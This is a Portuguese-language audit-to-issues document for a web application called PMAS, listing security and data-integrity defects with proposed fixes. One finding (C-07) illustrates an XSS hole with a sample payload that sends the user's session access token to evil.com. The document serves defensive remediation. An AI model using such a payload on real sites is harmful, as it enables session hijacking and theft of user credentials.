# PMAS — Mapeamento de Correções para Issues

> Gerado em: 2026-05-28  
> Branch de referência: `claude/create-project-docs-qJaUo`  
> Total: 52 itens | 7 Críticos · 18 Altos · 20 Médios · 7 Baixos

---

## Como usar este arquivo

Cada seção abaixo representa um issue independente.  
Campos sugeridos para o issue:  
- **Título** → usar o nome da seção  
- **Labels** → `bug`, `security`, `tech-debt`, `test-coverage` + nível (`critical`, `high`, `medium`, `low`)  
- **Milestone** → Sprint indicado  

---

## CRÍTICOS

---

### [C-01] Senha padrão "admin" sem expiração forçada

**Sprint:** 0 (imediato)  
**Labels:** `security`, `critical`  
**Critério:** CR-13 — Secrets e credenciais  

**Arquivo:** `backend/app/database.py:98–114`

**Problema:**  
Na inicialização do banco, o usuário admin é criado com senha literal `"admin"`. O sistema emite um log de aviso mas não bloqueia acesso nem força troca obrigatória. Qualquer sistema exposto na rede antes da primeira configuração é comprometível imediatamente com `admin:admin`.

**Correção proposta:**
1. Gerar senha aleatória no bootstrap: `secrets.token_urlsafe(16)`
2. Exibir a senha gerada **uma única vez** no stdout/log de inicialização
3. Não permitir login com senha padrão gerada após primeiro uso (ou forçar troca no primeiro acesso)

---

### [C-02] JWT Secret Key volátil e sem validação de entropia

**Sprint:** 0 (imediato)  
**Labels:** `security`, `critical`  
**Critério:** CR-10 — Autenticação JWT  

**Arquivo:** `backend/app/deps.py:17–26`

**Problema:**  
Se `PMAS_SECRET_KEY` não está definida, `secrets.token_hex(32)` é gerado a cada inicialização do processo — todos os tokens JWT são invalidados em cada restart. Adicionalmente, `.env` não consta no `.gitignore`, portanto um commit acidental exporia a chave de produção.

**Correção proposta:**
1. Adicionar `.env` ao `.gitignore`
2. Fazer o servidor falhar na inicialização (`sys.exit(1)`) se `PMAS_SECRET_KEY` não estiver definida em produção
3. Adicionar validação de entropia mínima: `len(secret) >= 32`
4. Documentar em README como gerar: `python -c "import secrets; print(secrets.token_hex(32))"`

---

### [C-03] ACL ausente em `/api/v2/trends` e `/api/v2/filters`

**Sprint:** 1  
**Labels:** `security`, `bug`, `critical`  
**Critério:** CR-05 — ACL enforcement  

**Arquivos:**
- `backend/app/routers/v2/trends.py:25`
- `backend/app/routers/v2/filters.py:20`

**Problema:**  
Ambos os endpoints usam `_=Depends(get_current_user)` descartando o usuário — nenhuma chamada a `_allowed_peps()` é feita. Um usuário com ACL restrita a "PEP-A" pode consultar trends e filtros de todos os PEPs do sistema, expondo nomes de projetos, colaboradores e dados de alocação não autorizados.

**Correção proposta:**
```python
# Em ambos os endpoints, após obter current_user:
allowed = _allowed_peps(db, current_user)
if allowed is not None:
    if pep_wbs:
        pep_wbs = [p for p in pep_wbs if p in allowed]
    else:
        pep_wbs = allowed
```

---

### [C-04] `cost_per_hour = 0.0` salvo sem marcador semântico

**Sprint:** 1  
**Labels:** `bug`, `critical`  
**Critério:** CR-03 — Frozen cost pattern  

**Arquivo:** `backend/app/services/ingestion.py:401–423`

**Problema:**  
Quando um colaborador não tem `seniority_level` atribuído, `_lookup_rate()` retorna `0.0`. A ingestão emite um warning mas prossegue salvando `cost_per_hour=0.0` sem nenhum marcador. Torna-se impossível distinguir "taxa zero intencional" de "taxa ausente". Registros históricos ficam com custo permanentemente zerado; atribuir seniority depois não recalcula o passado.

**Correção proposta:**
1. Adicionar coluna `rate_was_resolved: bool DEFAULT True` em `TimesheetRecord`
2. Quando `rate == 0.0` por ausência de seniority, salvar `rate_was_resolved=False`
3. Exibir badge de aviso no dashboard para PEPs com registros `rate_was_resolved=False`
4. Registrar no AuditLog os colaboradores com taxa não resolvida por upload

---

### [C-05] DELETE + INSERT na ingestão não é atômico

**Sprint:** 1  
**Labels:** `bug`, `critical`  
**Critério:** CR-01 — Atomicidade de transações  

**Arquivo:** `backend/app/services/ingestion.py:340–357`

**Problema:**  
A Fase 4 da ingestão executa DELETE por `(pep_wbs, cycle_id)` com `synchronize_session=False` e depois insere novos registros. Se o processo encerrar entre o DELETE e o INSERT (crash, OOM, SIGKILL), o período de timesheet fica completamente vazio sem possibilidade de recuperação.

**Correção proposta:**
1. Antes do DELETE, serializar os registros que serão removidos e gravar em AuditLog com `action="ingest_delete"`
2. Envolver toda a Fase 4 em um savepoint SQLAlchemy explícito:
   ```python
   with db.begin_nested():  # savepoint
       db.query(TimesheetRecord).filter(...).delete(...)
       db.bulk_save_objects(new_records)
   ```
3. Em caso de falha, o savepoint faz rollback sem afetar a transação externa

---

### [C-06] `_migrate_columns()` tem race condition e usa cache stale de schema

**Sprint:** 1  
**Labels:** `bug`, `critical`  
**Critério:** CR-02 — Thread-safety de migrations  

**Arquivo:** `backend/app/database.py:119–210`

**Problema:**  
Dois problemas cumulativos:
1. `tr_cols` é capturado na linha 124 antes de qualquer ALTER. Nas linhas 203–208, o mesmo set antigo é usado para verificar se `normal_cost` existe — se o ALTER anterior falhou, a verificação não detecta.
2. Em ambiente multi-processo (Gunicorn), dois workers passam simultaneamente pelo `if "column" not in tr_cols` e ambos executam `ALTER TABLE` → `database is locked`.

**Correção proposta:**
1. Criar tabela `schema_migrations (version TEXT PRIMARY KEY, applied_at DATETIME)` como lock pessimista
2. Re-executar `PRAGMA table_info()` após cada ALTER para atualizar o set
3. Envolver toda a função em `EXCLUSIVE` transaction no SQLite

---

### [C-07] XSS via injeção em atributo `onclick` com dados do servidor

**Sprint:** 2  
**Labels:** `security`, `bug`, `critical`  
**Critério:** CR-15 — XSS  

**Arquivo:** `frontend/app.js:~1695`

**Problema:**  
```javascript
`onclick="editPlan(${pl.cycle_id}, ${escHtml(JSON.stringify(pl.cycle_name))}, 
  ${pl.planned_hours}, ${pl.planned_cost ?? 'null'})"`
```
`pl.planned_hours` e `pl.planned_cost` são inseridos diretamente no handler sem `escHtml()`. Um valor como `0); fetch('https://evil.com?t='+sessionStorage.getItem('access_token'));//` executa no contexto do usuário autenticado.

**Correção proposta:**
```javascript
// Usar data-* attributes e addEventListener
tr.dataset.cycleId   = pl.cycle_id;
tr.dataset.cycleName = pl.cycle_name;
tr.dataset.hours     = pl.planned_hours;
tr.dataset.cost      = pl.planned_cost ?? '';
btn.addEventListener('click', () => {
  editPlan(+tr.dataset.cycleId, tr.dataset.cycleName,
           +tr.dataset.hours,   +tr.dataset.cost || null);
});
```

---

## ALTOS

---

### [A-01] Upload sem validação de magic bytes (logo e CSV/XLSX)

**Sprint:** 2  
**Labels:** `security`, `high`  
**Critério:** CR-11 — Validação de upload  

**Arquivos:**
- `backend/app/services/theme_svc.py:31–34`
- `backend/app/routers/upload.py:47–51`

**Problema:**  
Validação apenas por extensão de nome de arquivo. Um `.php` ou SVG com JavaScript renomeado para `.png` passa. Um ZIP bomb renomeado para `.xlsx` é descompactado pelo openpyxl em memória.

**Correção proposta:**
1. Adicionar `python-magic` ao `requirements.txt`
2. Ler os primeiros 2048 bytes e validar o MIME type real
3. Para XLSX: limitar linhas lidas pelo pandas (`nrows=50000`)
4. Para logo: rejeitar SVG mesmo com extensão de imagem válida

---

### [A-02] Rate limiting de login por IP, não por usuário

**Sprint:** 0 (imediato)  
**Labels:** `security`, `high`  
**Critério:** CR-14 — Força bruta  

**Arquivo:** `backend/app/routers/auth.py:31`

**Problema:**  
10 tentativas/minuto por IP. Atacante com 10 IPs faz 100 tentativas/minuto. Sem lockout por username após tentativas falhadas. Senha de 6 caracteres all-numeric tem ~1 milhão de combinações.

**Correção proposta:**
1. Rate limit por `(IP + username)`: `5/minute` por combinação
2. Após 5 falhas consecutivas para um username: lockout de 15 minutos
3. Armazenar contador de falhas em `GlobalConfig` ou tabela `LoginAttempt`

---

### [A-03] CORS aceita origens via env var sem validação de formato

**Sprint:** 0 (imediato)  
**Labels:** `security`, `high`  
**Critério:** CR-12 — CORS e CSRF  

**Arquivo:** `backend/app/main.py:87–102`

**Problema:**  
`PMAS_ALLOWED_ORIGINS` é splitado por vírgula sem validar se os valores são URLs bem formadas. `allow_credentials=True` com origem indevida permite CSRF.

**Correção proposta:**
```python
import re
_URL_RE = re.compile(r'^https?://[a-zA-Z0-9._:-]+$')
_extra_origins = [
    o.strip() for o in os.getenv("PMAS_ALLOWED_ORIGINS", "").split(",")
    if o.strip() and _URL_RE.match(o.strip())
]
```

---

### [A-04] Endpoints de lista sem paginação (risco de OOM)

**Sprint:** 3  
**Labels:** `bug`, `high`  
**Critério:** CR-06 — Paginação  

**Arquivos:**
- `backend/app/routers/dashboard.py` (collaborator-timeline)
- `backend/app/routers/v2/runway.py`
- `backend/app/routers/v2/concentration.py`

**Problema:**  
Retornam todo o histórico sem `limit`/`offset`. Com 2 anos × 100 colaboradores × 30 projetos, a resposta pode exceder centenas de MB e esgotar a memória do servidor.

**Correção proposta:**
1. Adicionar parâmetros `limit: int = Query(default=500, le=2000)` e `offset: int = Query(default=0, ge=0)`
2. Aplicar `.limit(limit).offset(offset)` na query
3. Retornar header `X-Total-Count` para o frontend saber o total

---

### [A-05] DELETE de entidades sem verificação de dependências FK

**Sprint:** 3  
**Labels:** `bug`, `high`  
**Critério:** CR-07 — DELETE com FK  

**Arquivos:**
- `backend/app/routers/projects.py:172–179`
- `backend/app/routers/users.py:65–74`

**Problema:**  
DELETE de `Project` não verifica `TimesheetRecord`, `ProjectCyclePlan`, `ProjectBaseline`. DELETE de `User` não verifica `UploadSession`. Pode deixar registros órfãos ou falhar com erro opaco de constraint.

**Correção proposta:**
```python
# Antes do delete em projects.py
records_count = db.query(TimesheetRecord).filter_by(pep_wbs=project.pep_wbs).count()
if records_count > 0:
    raise HTTPException(409, f"Projeto possui {records_count} registros de timesheet.")
```

---

### [A-06] N+1 query em `list_team()`

**Sprint:** 3  
**Labels:** `bug`, `high`  
**Critério:** CR-06 — Paginação / performance  

**Arquivo:** `backend/app/routers/ratecard.py:315–343`

**Problema:**  
Para cada colaborador na lista, acessa `c.seniority_level.name` sem eager loading. Com 200 colaboradores → 201 queries por requisição.

**Correção proposta:**
```python
from sqlalchemy.orm import joinedload
collaborators = (
    db.query(Collaborator)
    .options(joinedload(Collaborator.seniority_level))
    .all()
)
```

---

### [A-07] Encoding de CSV inconsistente entre routers

**Sprint:** 3  
**Labels:** `bug`, `high`  
**Critério:** CR-09 — Encoding CSV  

**Arquivos:** `cycles.py:137`, `projects.py:118`, `ratecard.py:86`, `plans.py:82`

**Problema:**  
Alguns routers usam `pd.read_csv(io.BytesIO(raw))` sem encoding; outros usam `.decode("utf-8-sig")`. Arquivos Windows com ISO-8859-1 falham silenciosamente ou produzem caracteres corrompidos.

**Correção proposta:**
```python
# Padrão para todos os routers de import CSV
try:
    text = raw.decode("utf-8-sig")
except UnicodeDecodeError:
    text = raw.decode("latin-1")
df = pd.read_csv(io.StringIO(text))
```

---

### [A-08] `normal_cost`, `extra_cost`, `standby_cost` nullable sem garantia pós-ingestão

**Sprint:** 1  
**Labels:** `bug`, `high`  
**Critério:** CR-03 — Frozen cost pattern  

**Arquivo:** `backend/app/models.py:86–88`

**Problema:**  
Campos são `nullable=True` mas deveriam ser sempre preenchidos após ingestão. Se a ingestão falha parcialmente, registros ficam com costs NULL — impossível calcular custo retroativamente.

**Correção proposta:**
1. Alterar para `nullable=False, default=0.0` via `_migrate_columns()`
2. Adicionar migration que converte NULLs existentes para `0.0`

---

### [A-09] `freeze_costs()` sem validação de valores negativos ou NaN

**Sprint:** 3  
**Labels:** `bug`, `high`  
**Critério:** CR-04 — Edge cases EVM  

**Arquivo:** `backend/app/services/evm.py:13–29`

**Problema:**  
`cost_per_hour`, `extra_multiplier` e `standby_multiplier` negativos produzem custos negativos — "economia" falsa. Sem guard para `math.isnan()` ou `math.isinf()`.

**Correção proposta:**
```python
def freeze_costs(cost_per_hour, normal_h, extra_h, standby_h, em=1.5, sm=0.33):
    if any(math.isnan(v) or math.isinf(v) or v < 0
           for v in [cost_per_hour, normal_h, extra_h, standby_h, em, sm]):
        raise ValueError("freeze_costs recebeu valor inválido")
    ...
```

---

### [A-10] AuditLog não registra registros deletados na ingestão

**Sprint:** 1  
**Labels:** `bug`, `high`  
**Critério:** CR-21 — Audit trail  

**Arquivo:** `backend/app/services/ingestion.py:340–478`

**Problema:**  
O DELETE da Fase 4 ocorre sem nenhuma entrada de audit. O AuditLog registra apenas o upload como um todo. Impossível rastrear quais registros específicos foram removidos em um re-upload.

**Correção proposta:**
```python
# Antes do DELETE na fase 4
deleted_records = db.query(TimesheetRecord).filter(...).all()
log_audit(db, uploader, "ingest_delete",
          entity="TimesheetRecord",
          old_value=[r.__dict__ for r in deleted_records])
db.query(TimesheetRecord).filter(...).delete(...)
```

---

### [A-11] GET `/api/theme` (público) executa INSERT no banco

**Sprint:** 1  
**Labels:** `bug`, `high`  
**Critério:** CR-01 — Atomicidade / REST  

**Arquivo:** `backend/app/routers/theme.py:23–28`

**Problema:**  
Endpoint sem autenticação cria `GlobalConfig(id=1)` se não existir. Viola REST (GET não modifica estado) e gera race condition com múltiplas requisições simultâneas atingindo o branch `if cfg is None`.

**Correção proposta:**
1. Remover o bloco de criação do GET endpoint
2. Garantir que `init_db()` sempre cria o GlobalConfig na inicialização
3. Se `cfg is None` no GET, retornar valores defaults sem persistir

---

### [A-12] `dispose()` não chamado no logout; ResizeObserver nunca desconectado

**Sprint:** 2  
**Labels:** `bug`, `high`  
**Critério:** CR-17 — Memory leaks  

**Arquivo:** `frontend/app.js:187–209, ~3328`

**Problema:**  
`_disposeTabCharts()` não é chamado em `logout()` nem ao trocar para abas não-analytics (Projects, Team, Admin). O `ResizeObserver` criado na linha ~206 nunca tem `disconnect()` chamado.

**Correção proposta:**
```javascript
function _logout() {
  // Dispor todos os charts
  Object.keys(CHARTS_PER_TAB).forEach(_disposeTabCharts);
  _ro.disconnect();
  sessionStorage.removeItem('access_token');
  // ...
}
```

---

### [A-13] `Promise.all` no portfolio falha silenciosamente

**Sprint:** 2  
**Labels:** `bug`, `high`  
**Critério:** CR-18 — Race conditions assíncronas  

**Arquivo:** `frontend/app.js:~834–839`

**Problema:**  
`/api/v2/portfolio` não tem `.catch()` — qualquer erro nesse fetch rejeita todo o `Promise.all`, descartando dados de runway e concentration que podem ter retornado com sucesso.

**Correção proposta:**
```javascript
const [health, trends, runway, concentration] = await Promise.all([
  apiFetch(`/api/v2/portfolio?${p}`).catch(() => { _showSectionError('portfolio'); return []; }),
  apiFetch(`/api/v2/trends?${p}`).catch(() => []),
  apiFetch(`/api/v2/runway?${p}`).catch(() => []),
  apiFetch(`/api/v2/concentration?${p}`).catch(() => []),
]);
```

---

### [A-14] Event listeners acumulam em tabelas re-renderizadas

**Sprint:** 2  
**Labels:** `bug`, `high`  
**Critério:** CR-17 — Memory leaks  

**Arquivo:** `frontend/app.js:~2348–2355` (allocation matrix), `~4242–4245` (session detail)

**Problema:**  
`addEventListener` é adicionado ao `thead` após cada `innerHTML =` — após N re-renders há N handlers ativos. Cada clique de sort dispara N vezes. Listeners de modal de detalhes não são removidos ao fechar.

**Correção proposta:**
```javascript
// Usar event delegation no container pai que não é recriado
matrixWrapper.addEventListener('click', e => {
  const th = e.target.closest('th[data-sort-key]');
  if (!th) return;
  // sort logic
});
// Mover para fora da função de render — executar apenas uma vez
```

---

### [A-15] Strings em português hardcoded sem `_t()` em app.js

**Sprint:** 2  
**Labels:** `bug`, `high`  
**Critério:** CR-19 — Cobertura i18n  

**Arquivo:** `frontend/app.js` (linhas ~259, ~1878, ~2682)

**Problema:**  
```javascript
const header = 'Colaborador,Horas Normais,Horas Extras,Sobreaviso,Total';  // ~259
notify(`Erro ao importar: ${e.message}`, 'error');                          // ~1878
'<p style="color:#64748b">Carregando…</p>'                                  // ~2682
```
Usuário em inglês recebe português fixo nesses pontos.

**Correção proposta:**
1. Mapear cada ocorrência para uma chave `_t()`
2. Adicionar as chaves faltantes em `pt.js` e `en.js`

---

### [A-16] ACL de quarentena verifica usuário mas não projeto

**Sprint:** 1  
**Labels:** `bug`, `high`  
**Critério:** CR-05 — ACL enforcement  

**Arquivo:** `backend/app/routers/quarantine.py:115–149`

**Problema:**  
Usuário não-admin vê apenas registros de seus uploads, mas sem filtro de `_allowed_peps`. Se a ACL do usuário for reduzida após o upload, ele continua vendo registros de quarentena de PEPs não autorizados.

**Correção proposta:**
```python
allowed = _allowed_peps(db, current_user)
if current_user.role != "admin":
    q = q.filter(QuarantineRecord.uploaded_by == current_user.username)
    if allowed is not None:
        q = q.filter(QuarantineRecord.pep_wbs.in_(allowed))
```

---

### [A-17] SPI > 1.0 sem interpretação diferenciada — falsa confiança

**Sprint:** 3  
**Labels:** `bug`, `high`  
**Critério:** CR-04 — Edge cases EVM  

**Arquivo:** `backend/app/services/evm.py:70–82`

**Problema:**  
`compute_spi()` retorna razão pura sem cap. SPI = 2.0 renderizado como "verde" no semáforo pode mascarar scope creep ou baseline errada.

**Correção proposta:**
1. Adicionar campo `spi_status: "ahead" | "on_track" | "behind" | "no_baseline"` no response
2. Frontend: SPI > 1.1 → indicador "Adiantado" (azul) distinto de "No prazo" (verde)
3. Tooltip explicando: "SPI > 1 pode indicar escopo não planejado ou baseline sub-estimada"

---

### [A-18] Log de sucesso de ingestão executado fora do `try-except`

**Sprint:** 1  
**Labels:** `bug`, `high`  
**Critério:** CR-01 — Atomicidade  

**Arquivo:** `backend/app/services/ingestion.py:481–490`

**Problema:**  
`log.info("Ingestão concluída")` executa sempre, inclusive após `db.rollback()`, fazendo operadores concluírem erroneamente que o upload foi bem-sucedido quando os dados não foram persistidos.

**Correção proposta:**
```python
try:
    db.commit()
    log.info("Ingestão concluída com sucesso: %d inseridos", inserted)
except Exception:
    db.rollback()
    log.error("Ingestão falhou — rollback executado")
    raise
```

---

## MÉDIOS

---

### [M-01] RateCard sem constraint `valid_from <= valid_to`

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-02  
**Arquivo:** `backend/app/models.py:41`

Taxa com datas invertidas é aceita pelo ORM; `_lookup_rate()` pode não encontrar taxa nenhuma para um período válido.

**Correção:** Adicionar `CheckConstraint("valid_to IS NULL OR valid_from <= valid_to")` via `_migrate_columns()` e validar no schema Pydantic (`@validator`).

---

### [M-02] `AuditLog.timestamp` sem índice — full scan em tabela grande

**Sprint:** 3  
**Labels:** `tech-debt`, `medium`  
**Critério:** CR-21  
**Arquivo:** `backend/app/models.py:193`

Queries por período de auditoria fazem full table scan. Com logs de 2 anos, consultas levam vários segundos.

**Correção:** `Column("timestamp", DateTime, index=True, ...)` + migration com `CREATE INDEX`.

---

### [M-03] `pep_wbs` indexado e nullable — índice ineficaz para `IS NOT NULL`

**Sprint:** 4  
**Labels:** `tech-debt`, `medium`  
**Critério:** CR-06  
**Arquivo:** `backend/app/models.py:78–79`

SQLite não indexa NULLs. O índice em `pep_wbs` não cobre o filtro `WHERE pep_wbs IS NOT NULL` — sempre full scan.

**Correção:** Adicionar índice parcial via raw SQL: `CREATE INDEX IF NOT EXISTS ix_ts_pep_wbs_notnull ON timesheet_record (pep_wbs) WHERE pep_wbs IS NOT NULL`.

---

### [M-04] GlobalConfig pode ser deletado manualmente — PK conflict na reinicialização

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-02  
**Arquivo:** `backend/app/database.py:86–96`

Se `DELETE FROM global_config WHERE id=1` for executado diretamente no banco, próximo request tenta `INSERT id=1` e falha com PRIMARY KEY constraint — cascata de erros 500.

**Correção:** Usar `INSERT OR IGNORE` ou `ON CONFLICT DO NOTHING`; adicionar `UNIQUE(id)` e verificar antes de inserir.

---

### [M-05] Excel epoch Mac vs Windows — datas off por 4 anos

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-23  
**Arquivo:** `backend/app/services/ingestion.py:590–597`

Arquivos criados em Mac Excel usam epoch 1904-01-01 (não 1899-12-30). Datas ficam erradas em 1462 dias.

**Correção:**
```python
# Detectar epoch pelo flag do XLSX
import openpyxl
wb = openpyxl.load_workbook(filepath)
epoch = date(1904, 1, 1) if wb.epoch == openpyxl.utils.datetime.CALENDAR_MAC_1904 else date(1899, 12, 30)
```

---

### [M-06] `_safe_hours()` sem limite superior — 999.999h/dia aceito

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-23  
**Arquivo:** `backend/app/services/ingestion.py:224–231`

Valores absurdos passam pela validação de regras sem quarantine automático.

**Correção:** Adicionar `MAX_DAILY_HOURS = 24.0` e quarantinar registros que excedam; ou adicionar `ValidationRule` padrão de sistema para `total_hours > 24`.

---

### [M-07] Nome de colaborador não normalizado — duplicatas por capitalização/espaços

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-23  
**Arquivo:** `backend/app/services/ingestion.py:171`

"JOÃO DA SILVA" e "João da Silva" e "João  Silva" são tratados como colaboradores distintos. Horas ficam divididas entre variantes.

**Correção:**
```python
name = " ".join(str(row[_COL_COLLABORATOR]).strip().split()).title()
```

---

### [M-08] Cache de ciclos na ingestão não é atualizado durante processamento longo

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-22  
**Arquivo:** `backend/app/services/ingestion.py:146–149`

Ciclos são carregados uma única vez no início. Se admin desativa um ciclo durante um upload grande (> 5 min), os registros são inseridos no ciclo desativado.

**Correção:** Re-consultar ciclo por data a cada N linhas processadas (ex: a cada 500 linhas) ou usar query lazy por data dentro do loop.

---

### [M-09] `freeze_spi_boundary()` sem proteção contra duplicatas de data ou valores negativos

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-04  
**Arquivo:** `backend/app/services/evm.py:239–268`

`period_h` negativo ou duas entradas com mesmo `c_start` produzem resultados incorretos no SPI congelado.

**Correção:**
```python
actual_series = [(s, max(h, 0.0)) for s, h in actual_series]
# Deduplicate por c_start:
from collections import defaultdict
merged = defaultdict(float)
for s, h in actual_series:
    merged[s] += h
actual_series = sorted(merged.items())
```

---

### [M-10] Filtro por data usa critério diferente em summary vs fallback do effort

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-08  
**Arquivo:** `backend/app/routers/v2/effort.py:61–135`

`_effort_from_summary()` filtra por `Cycle.start_date`; `_effort_fallback()` filtra por `TimesheetRecord.record_date`. O mesmo `date_from`/`date_to` produz resultados diferentes dependendo do caminho.

**Correção:** Padronizar para `record_date` em ambos os caminhos (ou `Cycle.start_date` em ambos, com decisão documentada).

---

### [M-11] `date_from > date_to` aceito sem validação

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-08  
**Arquivos:** múltiplos routers com `date_from`/`date_to`

Intervalo invertido retorna conjunto vazio sem aviso.

**Correção:**
```python
if date_from and date_to and date_from > date_to:
    raise HTTPException(400, "date_from não pode ser posterior a date_to")
```

---

### [M-12] `reorder_rules` sem schema Pydantic — IDs inválidos ignorados silenciosamente

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-24  
**Arquivo:** `backend/app/routers/validation_rules.py:114–124`

Dict `{rule_id: new_order}` aceito sem validação. IDs inexistentes não geram erro.

**Correção:** Criar `class ReorderRulesIn(BaseModel): orders: dict[int, int]` e verificar que todos os IDs existem antes de persistir.

---

### [M-13] Cache `_baselineByProject` não atualizado após criar baseline

**Sprint:** 2  
**Labels:** `bug`, `medium`  
**Critério:** CR-16  
**Arquivo:** `frontend/app.js:~2498, ~2753–2759`

Após `_createBaseline()`, `loadProjectsTable()` é chamado mas `_baselineByProject` pode não ser re-populado corretamente se o fetch de baselines for feito antes do commit do backend completar.

**Correção:** Após criar ou deletar baseline, aguardar `await loadProjectsTable()` com refetch explícito de baselines.

---

### [M-14] Paridade de chaves entre `pt.js` e `en.js` incompleta

**Sprint:** 2  
**Labels:** `bug`, `medium`  
**Critério:** CR-19  
**Arquivos:** `frontend/lang/pt.js`, `frontend/lang/en.js`

`pt.js` tem ~650 chaves; `en.js` tem ~200. Chaves ausentes em `en.js` fazem `_t()` retornar a chave literal em modo inglês.

**Correção:**
1. Criar script de verificação: `diff <(grep -o "'[^']*':" lang/pt.js | sort) <(grep -o "'[^']*':" lang/en.js | sort)`
2. Adicionar todas as chaves faltantes em `en.js`
3. Adicionar o script ao CI para garantir paridade futura

---

### [M-15] Filtros de data salvos em `localStorage` — persistência além da sessão

**Sprint:** 3  
**Labels:** `bug`, `medium`  
**Critério:** CR-16  
**Arquivo:** `frontend/app.js:~1027`

Datas de filtro persistem em `localStorage` entre sessões e usuários no mesmo navegador.

**Correção:** Migrar para `sessionStorage` ou limpar em logout.

---

### [M-16] Race condition: ciclo fechado durante upload não é detectada

**Sprint:** 4  
**Labels:** `test-coverage`, `medium`  
**Critério:** CR-20  
**Arquivo:** `tests/test_ingestion.py`

Não há teste que simula fechamento de ciclo entre início e fim de uma ingestão.

**Teste a adicionar:**
```python
def test_cycle_closed_mid_ingestion(db_session):
    cy = _cycle(db_session, open=True)
    # Simular fechamento durante ingestão
    cy.is_closed = True
    db_session.commit()
    # Re-upload deve rejeitar com erro claro
```

---

### [M-17] `UserProjectAccess` vazio vs. sem linha — semântica não testada

**Sprint:** 4  
**Labels:** `test-coverage`, `medium`  
**Critério:** CR-20 + CR-05  
**Arquivo:** `tests/test_ingestion.py`

Não há teste diferenciando user sem nenhuma linha na tabela (acesso total) de user com linhas deletadas (deveria ter acesso total também, mas pode haver regressão).

**Teste a adicionar:** Criar ACL, deletar todas as linhas, verificar que user volta a ter acesso total.

---

### [M-18] EVM com `cost_per_hour = 0` em todo o projeto — sem teste de integração

**Sprint:** 4  
**Labels:** `test-coverage`, `medium`  
**Critério:** CR-20 + CR-04  
**Arquivo:** `tests/test_v2_endpoints.py`

`compute_cpi_ev` com `actual_cost = 0` (todos os colaboradores sem taxa) não é testado em contexto de API — apenas em unit tests.

**Testes a adicionar:** Portfolio health, CPI e forecast quando `total_cost = 0.0` para todos os registros.

---

### [M-19] `_migrate_columns()` sem nenhum teste automatizado

**Sprint:** 4  
**Labels:** `test-coverage`, `medium`  
**Critério:** CR-20 + CR-02  
**Arquivo:** `tests/` (arquivo novo a criar)

Upgrade de schema nunca é verificado automaticamente. Regressão de migration só é descoberta em produção.

**Teste a adicionar:**
```python
def test_migrate_columns_idempotent(tmp_path):
    # Criar DB com schema antigo (sem as colunas novas)
    # Rodar _migrate_columns()
    # Verificar que todas as colunas existem
    # Rodar _migrate_columns() novamente — não deve falhar
```

---

### [M-20] Approve de quarentena já-rejected — comportamento indefinido

**Sprint:** 4  
**Labels:** `test-coverage`, `bug`, `medium`  
**Critério:** CR-20 + CR-22  
**Arquivo:** `tests/test_quarantine.py`

Existe teste para approve×2 (→ 409) e reject de já-approved (→ 409). Não existe teste para approve de já-rejected.

**Teste a adicionar:**
```python
def test_approve_already_rejected_returns_409(client, db_session):
    rec = _quarantine_record(db_session, status="rejected")
    r = client.post(f"/api/quarantine/{rec.id}/approve", headers=admin_headers)
    assert r.status_code == 409
```

---

## BAIXOS

---

### [B-01] GlobalConfig sem `UNIQUE` constraint em `id` — múltiplas linhas possíveis

**Sprint:** 4  
**Labels:** `tech-debt`, `low`  
**Critério:** CR-02  
**Arquivo:** `backend/app/models.py:170–181`

INSERT com `id=2` seria aceito, quebrando a lógica de singleton.

**Correção:** Adicionar `UniqueConstraint("id")` ou `CheckConstraint("id = 1")` no modelo.

---

### [B-02] `db.commit()` duplicado em alguns paths do ratecard

**Sprint:** 4  
**Labels:** `tech-debt`, `low`  
**Critério:** CR-01  
**Arquivo:** `backend/app/routers/ratecard.py:59, 124, 297`

Ineficiente mas não causa erro funcional.

**Correção:** Remover chamadas redundantes, manter apenas um `commit()` por operação.

---

### [B-03] `_allowed_peps()` sem memoização por request — queries repetidas

**Sprint:** 4  
**Labels:** `tech-debt`, `low`  
**Critério:** CR-05  
**Arquivo:** `backend/app/routers/v2/portfolio.py:33–46`

Chamado em cada endpoint v2 independentemente. Se o mesmo request chain usa portfolio + runway + concentration, a query de ACL é executada 3 vezes.

**Correção:** Usar `functools.lru_cache` com chave `user_id` ou FastAPI dependency cache por request.

---

### [B-04] `date.today()` não mockado em testes de "data futura"

**Sprint:** 4  
**Labels:** `test-coverage`, `low`  
**Critério:** CR-20  
**Arquivo:** `tests/test_ingestion.py`

Testes de data futura dependem do ano real de execução.

**Correção:** Usar `freezegun` ou `unittest.mock.patch("backend.app.services.ingestion.date")` nos testes relevantes.

---

### [B-05] `GET /upload-history` não gera AuditLog de acesso

**Sprint:** 4  
**Labels:** `tech-debt`, `low`  
**Critério:** CR-21  
**Arquivo:** `backend/app/routers/upload.py:82–97`

Acesso ao histórico de uploads de outros usuários (se houver bug de ACL) seria invisível na auditoria.

**Correção:** Adicionar `log_audit(db, current_user, "list_upload_history")` em acessos admin.

---

### [B-06] Label `Cor ${i+1}` na paleta de gráficos hardcoded em português

**Sprint:** 4  
**Labels:** `tech-debt`, `low`  
**Critério:** CR-19  
**Arquivo:** `frontend/app.js:~4503`

```javascript
<label style="...">Cor ${i + 1}</label>
```

**Correção:** `_t('appearance.palette_color').replace('{n}', i + 1)` com chave adicionada em `pt.js` e `en.js`.

---

### [B-07] CSV export de quarentena não escapa aspas em `raw_data`

**Sprint:** 4  
**Labels:** `bug`, `low`  
**Critério:** CR-09  
**Arquivo:** `backend/app/routers/my.py:99–121`

Nomes com aspas ou quebras de linha no `raw_data` podem corromper o CSV gerado.

**Correção:** `csv.writer` já trata aspas por padrão com `quoting=csv.QUOTE_ALL`; verificar se está em uso; adicionar `quotechar='"'` explícito.

---

## RESUMO POR SPRINT

| Sprint | Itens | Foco |
|--------|-------|------|
| **0** — Imediato | C-01, C-02, A-02, A-03 | Segurança crítica de acesso |
| **1** — Dados | C-03, C-04, C-05, C-06, A-08, A-10, A-11, A-16, A-18 | Integridade e ACL |
| **2** — Frontend | C-07, A-12, A-13, A-14, A-15, M-13, M-14, M-15 | XSS, leaks, i18n |
